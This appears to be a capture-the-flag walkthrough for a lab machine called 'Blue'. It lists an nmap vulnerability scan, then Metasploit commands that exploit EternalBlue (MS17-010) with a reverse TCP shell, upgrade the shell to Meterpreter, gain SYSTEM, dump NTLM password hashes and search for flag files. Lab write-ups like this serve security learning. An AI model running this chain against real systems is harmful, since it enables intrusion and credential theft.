# Blue

## TARGET_IP = 10.10.98.168

## nmap 

```
nmap -sV -vv --script vuln TARGET_IP
```
## metasploit

```
msfconsole
```

```
msf6> search type:exploit name:ms17
```

```
msf6> use exploit/windows/smb/ms17_010_eternalblue
```

```
show options
```

```
msf6> RHOSTS=TARGET_IP
```

```
msf6> LHOST=vpn ip not the actual ip
```

```
msf6> set payload windows/x64/shell/reverse_tcp
```

```
exploit
```

```
C:\Windows\system32> background 
```

```
msf6> search shell_to_meterpreter
```
```
msf6> use post/multi/manage/shell_to_meterpreter
```

```
show options
```

```
msf6> set SESSION 1
```

```
exploit
```

```
msf6> sessions -l
```

```
msf6> sessions 2
```

```
C:\Windows\system32> getsystem
```

```
C:\Windows\system32> ps
```

```
C:\Windows\system32> hashdump
```

- Go to Google.com and crack the hash (these are NTLM hashes)

- Windows stores password hashes in the SAM (Security Account Manager) database.

```
search -f *flag*
```









